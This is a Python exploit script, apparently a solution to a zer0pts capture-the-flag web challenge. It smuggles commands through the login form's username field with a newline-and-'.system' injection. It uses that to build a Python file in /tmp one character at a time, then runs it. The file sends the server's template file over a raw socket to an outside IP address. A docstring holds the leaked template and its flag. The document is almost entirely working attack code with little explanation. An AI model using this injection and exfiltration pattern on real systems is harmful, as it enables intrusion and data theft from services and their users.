#!/usr/bin/env python3

import requests

HOST = 'web.ctf.zer0pts.com'
PORT = 8004

script = "import socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('140.113.24.143',9001));s.send(open('/home/app/templates/index.html','rb').read())"

def run(cmd):
    payload = {
        'username': '";\n.system {}\n'.format(cmd),
        'password': 'legoshi'
    }
    r = requests.post('http://{}:{}/login'.format(HOST, PORT), data=payload)

run('printf "">/tmp/l3o')
for c in script:
    print(c)
    run('printf "{}">>/tmp/l3o'.format(c))
run("python /tmp/l3o")


"""
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <title>Welcome</title>
    </head>

    <body>
        <h1>Welcome, {{name}}!</h1>
        {% if name == 'admin' %}
        <p>zer0pts{w0w_d1d_u_cr4ck_SHA256_0f_my_p4$$w0rd?}</p>
        {% else %}
        <p>No flag for you :(</p>
        {% endif %}
    </body>
</html>
"""